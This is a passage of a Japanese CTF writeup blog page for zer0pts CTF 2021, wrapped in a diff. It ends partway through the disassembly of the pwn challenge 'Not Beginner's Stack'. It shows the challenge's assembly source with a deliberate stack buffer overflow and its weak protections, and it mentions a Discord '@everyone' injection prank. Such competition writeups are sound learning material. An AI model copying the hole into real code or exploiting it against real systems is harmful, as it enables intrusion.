@@ -1,0 +1,1420 @@
+
+<!doctype html>
+<html lang="ja" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="@ret2home のブログや CTF の Writeup など">
+      
+      
+        <link rel="canonical" href="https://ret2home.github.io/blog/CTF/zer0pts-ctf-2021/">
+      
+      
+        <meta name="author" content="ret2home">
+      
+      <link rel="shortcut icon" href="../../assets/avatar.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.0">
+    
+    
+      
+        <title>zer0pts CTF 2021 writeup - risoria's blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bc7e593a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab28b872.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#7e56c2">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+    
+      
+    
+    
+  
+  
+    
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="zer0pts CTF 2021 writeup - risoria's blog">
+  <meta property="og:description" content="@ret2home のブログや CTF の Writeup など">
+  <meta property="og:url" content="https://ret2home.github.io/blog/CTF/zer0pts-ctf-2021/">
+  <meta property="og:image" content="https://ret2home.github.io/blog/assets/avatar.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@ret2home">
+  <meta name="twitter:creator" content="@ret2home">
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MJQPPFRVVS"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'G-MJQPPFRVVS');
+  </script>
+
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="deep-purple" data-md-color-accent="">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          コンテンツにスキップ
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://ret2home.github.io/blog/" title="risoria&#39;s blog" class="md-header-nav__button md-logo" aria-label="risoria's blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12h16m0-16a2 2 0 012 2v14a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h16m-7 14v-2h5v2h-5m-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59l3.99-4z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            risoria's blog
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              zer0pts CTF 2021 writeup
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="検索" placeholder="検索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/ret2home/blog/" title="リポジトリへ" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ret2home/blog
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../kyopro/joi2022-ho/" class="md-tabs__link">
+          競プロ
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../metared2021-5/" class="md-tabs__link md-tabs__link--active">
+          CTF
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../others/nanamogi/" class="md-tabs__link">
+          旅行記他
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://ret2home.github.io/blog/" title="risoria&#39;s blog" class="md-nav__button md-logo" aria-label="risoria's blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12h16m0-16a2 2 0 012 2v14a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h16m-7 14v-2h5v2h-5m-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59l3.99-4z"/></svg>
+
+    </a>
+    risoria's blog
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/ret2home/blog/" title="リポジトリへ" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ret2home/blog
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      競プロ
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="競プロ" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        競プロ
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2022-ho/" class="md-nav__link">
+      JOI 2021/2022 本選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2021-ho/" class="md-nav__link">
+      JOI 2020/2021 本選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2021-yo/" class="md-nav__link">
+      JOI 2020/2021 二次予選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2020-sp/" class="md-nav__link">
+      JOI 2019/2020 春合宿参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2020-ho/" class="md-nav__link">
+      JOI 2019/2020 本選参加記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      CTF
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="CTF" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        CTF
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../metared2021-5/" class="md-nav__link">
+      Metared CTF 5th Stage writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      picoCTF 2021 writeup
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="picoCTF 2021 writeup" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        <span class="md-nav__icon md-icon"></span>
+        picoCTF 2021 writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/" class="md-nav__link">
+      overview
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2-2" type="checkbox" id="nav-3-2-2">
+    
+    <label class="md-nav__link" for="nav-3-2-2">
+      pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="pwn" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-2-2">
+        <span class="md-nav__icon md-icon"></span>
+        pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/gauntlet/" class="md-nav__link">
+      Binary Gauntlet
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/cacheme/" class="md-nav__link">
+      Cache Me Outside
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/hereslibc/" class="md-nav__link">
+      Here's a LIBC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/unsubsc/" class="md-nav__link">
+      Unsubscriptions Are Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/filtered/" class="md-nav__link">
+      filtered-shellcode
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/kitengine/" class="md-nav__link">
+      Kit Engine
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/horsepower/" class="md-nav__link">
+      Download Horsepower
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2-3" type="checkbox" id="nav-3-2-3">
+    
+    <label class="md-nav__link" for="nav-3-2-3">
+      rev
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="rev" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-2-3">
+        <span class="md-nav__icon md-icon"></span>
+        rev
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/gogo/" class="md-nav__link">
+      gogo
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/easyasgdb/" class="md-nav__link">
+      Easy as GDB
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/powershelly/" class="md-nav__link">
+      powershelly
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/rolling/" class="md-nav__link">
+      Rolling My Own
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/checkpass/" class="md-nav__link">
+      checkpass
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../modctf-2021/" class="md-nav__link">
+      防衛省 CTF 参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        zer0pts CTF 2021 writeup
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      zer0pts CTF 2021 writeup
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目次">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目次
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    ポエム
+  </a>
+  
+    <nav class="md-nav" aria-label="ポエム">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    tl;dr
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    雑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-not-beginners-stack" class="md-nav__link">
+    [pwn] Not Beginner's Stack
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto-warsamup" class="md-nav__link">
+    [crypto] war(sa)mup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    おしまい
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../0x41414141-pwn/" class="md-nav__link">
+      0x41414141 CTF Writeup (pwn only)
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../pakenctf2020/" class="md-nav__link">
+      Paken CTF 2020 運営記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      旅行記他
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="旅行記他" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        旅行記他
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/nanamogi/" class="md-nav__link">
+      UFOキャッチャー制作中間記録・七模擬まで
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/TISF2023/" class="md-nav__link">
+      Thailand International Science Fair 2023 参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/kansai-trip2/" class="md-nav__link">
+      関西旅行記2 〜マスフェスタ参加記を添えて〜
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/ndfes2022/" class="md-nav__link">
+      灘校文化祭訪問記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/pakencamp2021/" class="md-nav__link">
+      パ研合宿 2021 運営記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目次">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目次
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    ポエム
+  </a>
+  
+    <nav class="md-nav" aria-label="ポエム">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    tl;dr
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    雑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-not-beginners-stack" class="md-nav__link">
+    [pwn] Not Beginner's Stack
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto-warsamup" class="md-nav__link">
+    [crypto] war(sa)mup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    おしまい
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/ret2home/blog/edit/master/docs/CTF/zer0pts-ctf-2021/index.md" title="編集" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>zer0pts CTF 2021 writeup</h1>
+                
+                <h2 id="_1">ポエム<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="tldr">tl;dr<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h3>
+<p>3/6 09:00 〜 3/7 21:00 に開催された zer0pts CTF 2021 にチーム 0xdef12e (ソロ) で参加しました。
+ptr-yudaiさんには SECCON Beginners の Discord で Villager B 関連で相談させて頂いたり、Paken CTF 2020でも色々（）と教えて頂いたりと個人的に一番お世話になっている CTF Player なので結構前から楽しみにしていたイベントです。</p>
+<p>問題は宣言されている通り、Guess 要素が本当になかったです。<del>テレビの謎解きもこれくらいを目指してくれ</del> 強いて言うなら、Janken VS yoshiking で本当にじゃんけんに 100 回連続で勝てれば...？（つらすぎ）</p>
+<p>さて、結果はと言うと Welcome とかを除くと 2 完でした。順位は 131/951 です（得点を得たチームのみ）。かな〜り微妙ですが、CTF 初心者としましては割と頑張った方なんです！！（主張）</p>
+<p><img alt="diploma" src="diploma.png" /></p>
+<h3 id="_2">雑<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>問題はもちろん面白かったですが、それ以外で一番面白かったのは Discord での <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/everyone" title="GitHub User: everyone">@everyone</a> Injection があった事ですね。#solve-notification で </p>
+<blockquote>
+<p><code>0xdef12e</code> solved <code>Welcome</code></p>
+</blockquote>
+<p>みたいな感じで誰がどれを解いたかが通知されるんですが、ID を <code>a`@everyone</code> にして <code>`</code> を閉じて <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/everyone" title="GitHub User: everyone">@everyone</a> メンションをした人がいました。その人はイエローカードを食らっていましたが、個人的に CTF らしくて面白かったです。</p>
+<h2 id="pwn-not-beginners-stack">[pwn] Not Beginner's Stack<a class="headerlink" href="#pwn-not-beginners-stack" title="Permanent link">&para;</a></h2>
+<p>ご親切にコードと初心者向けの説明書が同封されています。</p>
+<details>
+<summary>main.S</summary>
+
+<div class="highlight"><pre><span></span><code>global _start
+section .text
+
+%macro call 1
+;; __stack_shadow[__stack_depth++] = return_address;
+  mov ecx, [__stack_depth]
+  mov qword [__stack_shadow + rcx * 8], %%return_address
+  inc dword [__stack_depth]
+;; goto function
+  jmp %1
+  %%return_address:
+%endmacro
+
+%macro ret 0
+;; goto __stack_shadow[--__stack_depth];
+  dec dword [__stack_depth]
+  mov ecx, [__stack_depth]
+  jmp qword [__stack_shadow + rcx * 8]
+%endmacro
+
+_start:
+  call notvuln
+  call exit
+
+notvuln:
+;; char buf[0x100];
+  enter 0x100, 0
+;; vuln();
+  call vuln
+;; write(1, &quot;Data: &quot;, 6);
+  mov edx, 6
+  mov esi, msg_data
+  xor edi, edi
+  inc edi
+  call write
+;; read(0, buf, 0x100);
+  mov edx, 0x100
+  lea rsi, [rbp-0x100]
+  xor edi, edi
+  call read
+;; return 0;
+  xor eax, eax
+  ret
+
+vuln:
+;; char buf[0x100];
+  enter 0x100, 0
+;; write(1, &quot;Data: &quot;, 6);
+  mov edx, 6
+  mov esi, msg_data
+  xor edi, edi
+  inc edi
+  call write
+;; read(0, buf, 0x1000);
+  mov edx, 0x1000               ; [!] vulnerability
+  lea rsi, [rbp-0x100]
+  xor edi, edi
+  call read
+;; return;
+  leave
+  ret
+
+read:
+  xor eax, eax
+  syscall
+  ret
+
+write:
+  xor eax, eax
+  inc eax
+  syscall
+  ret
+
+exit:
+  mov eax, 60
+  syscall
+  hlt
+
+section .data
+msg_data:
+  db &quot;Data: &quot;
+__stack_depth:
+  dd 0
+
+section .bss
+__stack_shadow:
+  resb 1024
+</code></pre></div>
+</details>
+
+<details>
+<summary>Meta data</summary>
+
+<div class="highlight"><pre><span></span><code>chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE (0x400000)
+RWX:      Has RWX segments
+</code></pre></div>
+</details>
+
+<details>
+<summary>result of objdump</summary>
+
+<div class="highlight"><pre><span></span><code>00000000004000b0 &lt;_start&gt;:
+  4000b0:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4000b7:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x4000cc
+  4000be:   00 cc 00 40 00 
+  4000c3:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  4000ca:   eb 1f                   jmp    4000eb &lt;notvuln&gt;
+
+00000000004000cc &lt;..@2.return_address&gt;:
+  4000cc:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4000d3:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x4000eb
+  4000da:   00 eb 00 40 00 
+  4000df:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  4000e6:   e9 33 01 00 00          jmp    40021e &lt;exit&gt;
+
+00000000004000eb &lt;notvuln&gt;:
+  4000eb:   c8 00 01 00             enter  0x100,0x0
+  4000ef:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4000f6:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x40010b
+  4000fd:   00 0b 01 40 00 
+  400102:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  400109:   eb 71                   jmp    40017c &lt;vuln&gt;
+
+000000000040010b &lt;..@4.return_address&gt;:
+  40010b:   ba 06 00 00 00          mov    edx,0x6
+  400110:   be 28 02 60 00          mov    esi,0x600228
+  400115:   31 ff                   xor    edi,edi
+  400117:   ff c7                   inc    edi
+  400119:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  400120:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x400138
+  400127:   00 38 01 40 00 
+  40012c:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  400133:   e9 cb 00 00 00          jmp    400203 &lt;write&gt;
+
+0000000000400138 &lt;..@5.return_address&gt;:
+  400138:   ba 00 01 00 00          mov    edx,0x100
+  40013d:   48 8d b5 00 ff ff ff    lea    rsi,[rbp-0x100]
+  400144:   31 ff                   xor    edi,edi
+  400146:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  40014d:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x400165
+  400154:   00 65 01 40 00 
+  400159:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  400160:   e9 85 00 00 00          jmp    4001ea &lt;read&gt;
+
+0000000000400165 &lt;..@6.return_address&gt;:
+  400165:   31 c0                   xor    eax,eax
+  400167:   ff 0c 25 2e 02 60 00    dec    DWORD PTR ds:0x60022e
+  40016e:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  400175:   ff 24 cd 34 02 60 00    jmp    QWORD PTR [rcx*8+0x600234]
+
+000000000040017c &lt;vuln&gt;:
+  40017c:   c8 00 01 00             enter  0x100,0x0
+  400180:   ba 06 00 00 00          mov    edx,0x6
+  400185:   be 28 02 60 00          mov    esi,0x600228
+  40018a:   31 ff                   xor    edi,edi
+  40018c:   ff c7                   inc    edi
+  40018e:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  400195:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x4001aa
